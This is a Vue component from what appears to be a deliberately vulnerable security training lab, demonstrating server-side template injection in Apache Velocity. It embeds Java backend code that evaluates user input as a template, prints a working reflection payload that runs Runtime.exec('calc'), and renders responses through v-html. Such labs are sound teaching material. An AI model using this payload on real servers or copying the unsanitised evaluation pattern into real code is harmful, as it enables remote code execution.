<template>
    <div class="SSTI">
        <div class="top-left-text" style="color: black; font-weight: bold; text-align: left;">
            SSTI模板注入
            <el-button @click="drawerVisible = true" type="primary" class="ct-button">查看Java源码</el-button>
        </div>
        <el-container>
            <!-- 中间内容 -->
            <el-main class="main-container">
                <!-- 表格 -->
                <el-table :data="tableData" style="width: 200%">
                    <el-table-column prop="data" label="data" width="800">
                        <template slot-scope="scope">
                            <div v-html="parseText(scope.row.data)"></div>
                        </template>
                    </el-table-column>
                </el-table>

                <!-- 文本框 -->
                <div class="input-button-container">
                    <el-input v-model="inputValue" placeholder="payload=" style="width: 120px;"></el-input>
                    <el-button @click="fetchData" type="primary">执行</el-button>
                </div>
                <h5 style="color: white;">#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("calc")</h5>
            </el-main>
            <el-drawer :visible.sync="drawerVisible" direction="rtl" size="50%" title="Java代码示例">
            <div class="code-block">
                <h3>java源码</h3>
                <pre><code class="java">{{ javaCode }}</code></pre>
            </div>
            </el-drawer>
        </el-container>
    </div>
</template>

<script>
import qs from 'qs'; // 引入qs库，用于处理表单数据格式转换
import hljs from 'highlight.js';
import 'highlight.js/styles/tomorrow-night.css';

export default {
data() {
    return {
      tableData: [],
      inputValue: '',
      drawerVisible: false,
      javaCode: `
    @PostMapping("/SSTI")
    public Result SpEL(@RequestParam("payload") String payload) {
            Velocity.init();
            VelocityContext context = new VelocityContext();
            StringWriter stringWriter = new StringWriter();
            try {
                Velocity.evaluate(context,stringWriter,"SpEl",payload);
                return Result.success("成功");
            } catch (Exception e) {
                System.out.println(new RuntimeException(e));
                return Result.error("失败");
            }
    }
      `,
    };
  },
    methods: {
        fetchData() {
            const payload = this.inputValue;
            this.$axios.post('api/SSTI', qs.stringify({ payload: payload }), {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                }
            })
            .then((result) => {
                this.tableData = [result.data];
                this.formattedTableData = this.tableData.map(item => ({
                   ...item,
                    data: this.parseText(item.msg)
                }));
            })
          .catch((error) => {
                console.error('获取数据出错：', error);
            });
        },
    parseText(text) {
            return text? text.replace(/\n/g, '<br>') : '';
        },highlightCode() {
      this.$nextTick(() => {
        const codeBlocks = document.querySelectorAll('pre code');
        codeBlocks.forEach((block) => {
          hljs.highlightBlock(block);
        });
      });
    }
  },
  watch: {
    drawerVisible(newVal) {
      if (newVal) {
        this.highlightCode(); // 当抽屉打开时进行高亮显示
      }
    }
  }
};
</script>

<style scoped>
.CMD1 {
    text-align: center;
}

.main-container {
    padding: 20px;
    background-color: #ffffff;
}

.input-container {
    margin-top: 20px;
}
.input-button-container {
    display: flex;
    align-items: center;
    margin-top: 20px;
}
.code-block {
  margin-bottom: 20px;
  padding: 10px;
  background-color: #f4f4f4;
  border-radius: 8px;
}

pre {
  white-space: pre-wrap;
  word-wrap: break-word;
}

.ct-button {
  width: 120px;
  height: 40px;
  float: right;
}

.code-block {
  margin-left: 0;
  color: black;
  font-size: 16px;
  text-align: left;
}
</style>